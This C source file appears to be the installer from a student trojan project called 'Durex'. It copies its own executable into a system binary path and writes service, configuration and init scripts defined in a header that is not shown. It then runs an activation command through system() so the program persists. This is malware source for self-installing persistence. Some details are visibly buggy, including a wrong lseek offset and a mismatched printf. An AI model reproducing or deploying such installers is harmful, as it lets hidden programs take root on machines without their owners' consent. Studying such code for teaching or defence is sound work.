/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   install.c                                          :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: root </var/mail/root>                      +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2018/07/15 02:21:05 by root              #+#    #+#             */
/*   Updated: 2018/08/03 15:54:34 by root             ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

/* system */
#include <stdlib.h>
/* mmap */
#include <sys/mman.h>
#include <stdio.h>
#include "main.h"
/* Elf64 structures*/
#include <elf.h>

static int	install_error(int fd)
{
	if (fd >= 0)
		close(fd);
	remove(DUREX_BINARY_FILE);
	remove(DUREX_SERVICE_FILE);
	remove(DUREX_CONF_FILE);
	remove(DUREX_INIT_FILE);
	system("mpg123 audio/Slap.mp3 2>/dev/null");
	return 1;
}

static void	modify_binary(void *data, int size)
{
	Elf64_Ehdr	*hdr = (Elf64_Ehdr *)data;
	Elf64_Shdr	*shd = (Elf64_Shdr *)(data + hdr->e_shoff);

	for (size_t i = 0; i < hdr->e_shnum; i++) {
//		Elf64_Shdr	*shdr = section_header_table + i;
//		char		*name = (string_table) ? string_table + shdr->sh_name : NULL;

		if (shd[i].sh_type == SHT_SYMTAB || shd[i].sh_type == SHT_DYNSYM) {
			Elf64_Shdr	*symbol_assoc = shd + shd[i].sh_link;
			char		*symbol_table = (char *)data + symbol_assoc->sh_offset;
			size_t		symbol_addr = (size_t)data + shd[i].sh_offset;
			Elf64_Sym	*symbol = (Elf64_Sym *)symbol_addr;

			for (size_t j = 0; j < shd[i].sh_size / shd[i].sh_entsize; j++) {
				char	*sname = symbol_table + symbol->st_name;

				if (!strcmp(sname, "main") || !strcmp(sname, "durex")) {
					printf("%lx %lx %s\n", symbol->st_value, sname);
				}
				symbol_addr += shd[i].sh_entsize;
				symbol = (Elf64_Sym *)symbol_addr;
			}
		}
	}
	(void)size;
}

int			install_binary(const char *prog)
{
	int		durex;
	int		bin;
	void	*data;
	int		size;

	bin = open(DUREX_BINARY_FILE, O_CREAT | O_EXCL | O_WRONLY, 0755);
	if (bin < 0)
		return install_error(bin);
	if ((durex = open(prog, O_RDONLY)) == -1)
		return install_error(bin);
	size = lseek(durex, 1, SEEK_END);
	data = mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_PRIVATE, durex, 0);
	close(durex);
	if (size == -1 || data == MAP_FAILED)
		return install_error(bin);
	modify_binary(data, size);
	durex = write(bin, data, size);
	close(bin);
	munmap(data, size);
	if (durex != size)
		return install_error(-1);
	return 0;
}

int			install_service()
{
	int		fd;
	size_t	ret;
	
	fd = open(DUREX_SERVICE_FILE, O_CREAT | O_TRUNC | O_WRONLY, 0644);
	if (fd < 0)
		return install_error(fd);
	ret = write(fd, DUREX_SERVICE_SCRIPT, sizeof(DUREX_SERVICE_SCRIPT));
	close(fd);
	if (ret != sizeof(DUREX_SERVICE_SCRIPT))
		return install_error(-1);
	return 0;
}

int			install_conf()
{
	int		fd;
	size_t	ret;
	
	fd = open(DUREX_CONF_FILE, O_CREAT | O_TRUNC | O_WRONLY, 0644);
	if (fd < 0)
		return install_error(fd);
	ret = write(fd, DUREX_CONF_SCRIPT, sizeof(DUREX_CONF_SCRIPT));
	close(fd);
	if (ret != sizeof(DUREX_CONF_SCRIPT))
		return install_error(-1);
	return 0;	
}

int			install_init()
{
	int		fd;
	size_t	ret;
	
	fd = open(DUREX_INIT_FILE, O_CREAT | O_TRUNC | O_WRONLY, 0755);
	if (fd < 0)
		return install_error(-1);
	ret = write(fd, DUREX_INIT_SCRIPT, sizeof(DUREX_INIT_SCRIPT));
	close(fd);
	if (ret != sizeof(DUREX_INIT_SCRIPT))
		return install_error(-1);
	system(DUREX_ACTIVATE_SCRIPT);
	return 0;
}
